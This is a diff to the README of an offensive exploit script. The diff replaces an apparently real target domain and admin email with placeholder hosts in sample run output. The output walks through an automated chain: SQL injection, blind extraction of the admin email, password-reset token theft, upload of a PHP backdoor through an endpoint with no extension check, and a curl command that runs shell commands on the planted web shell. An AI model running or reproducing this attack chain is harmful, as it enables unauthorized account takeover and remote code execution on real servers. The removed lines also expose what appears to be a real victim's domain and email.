@@ -160,7 +160,7 @@ python3 exploit.py https://target.com --filebackdoor cmd7.php -o assets.php
 The script runs an interactive chain. You only need to manually change the password via browser — everything else is automated.
 
 ```
-$ python3 exploit.py https://console.ewadc.com --filebackdoor cmd7.php --backup cmd83.php
+$ python3 exploit.py https://localhost.yucaerin --filebackdoor cmd7.php --backup cmd83.php
 
   ┌─────────────────────────────────────────────────────────────┐
   │  Phase 1: SQL Injection                                     │
@@ -169,7 +169,7 @@ $ python3 exploit.py https://console.ewadc.com --filebackdoor cmd7.php --backup 
   ├─────────────────────────────────────────────────────────────┤
   │  Phase 2: Extract Admin Email                               │
   │  → Boolean-based blind extraction from tblstaff             │
-  │  [+] Admin email: office@ewadc.com                          │
+  │  [+] Admin email: office@localhost.yucaerin                 │
   ├─────────────────────────────────────────────────────────────┤
   │  Phase 3: Password Reset                                    │
   │  → Triggers forgot_password, then extracts token via SQLi   │
@@ -178,7 +178,7 @@ $ python3 exploit.py https://console.ewadc.com --filebackdoor cmd7.php --backup 
   │  ┌───────────────────────────────────────────────────────┐  │
   │  │  Reset link found! Open this URL in your browser:     │  │
   │  │                                                       │  │
-  │  │  https://target.com/admin/authentication/             │  │
+  │  │  https://localhost.yucaerin/admin/authentication/     │  │
   │  │    reset_password/1/1/fd7fbbf58f8137cac50ec40cec...   │  │
   │  │                                                       │  │
   │  │  Set a new password, then come back here.             │  │
@@ -192,7 +192,7 @@ $ python3 exploit.py https://console.ewadc.com --filebackdoor cmd7.php --backup 
   ├─────────────────────────────────────────────────────────────┤
   │  Phase 5: Upload Backdoor                                   │
   │  → Uploads via /admin/misc/upload_sales_file (no ext check) │
-  │  [+] Uploaded → https://target.com/uploads/newsfeed/1/...   │
+  │  [+] Uploaded → https://localhost.yucaerin/uploads/newsfeed/│
   ├─────────────────────────────────────────────────────────────┤
   │  Phase 6: Verify RCE                                        │
   │  → Tests shell with ?cmd=echo YUCA_OK                       │
@@ -204,7 +204,7 @@ $ python3 exploit.py https://console.ewadc.com --filebackdoor cmd7.php --backup 
   │                                                             │
   │  ┌───────────────────────────────────────────────────────┐  │
   │  │  Backdoor location:                                   │  │
-  │  │  https://target.com/uploads/newsfeed/1/yuca_x8k2.php  │  │
+  │  │  https://localhost.yucaerin/uploads/newsfeed/1/yuca_x8k2.php  │  │
   │  │                                                       │  │
   │  │  curl 'https://target.com/.../yuca_x8k2.php?cmd=id'  │  │
   │  └───────────────────────────────────────────────────────┘  │
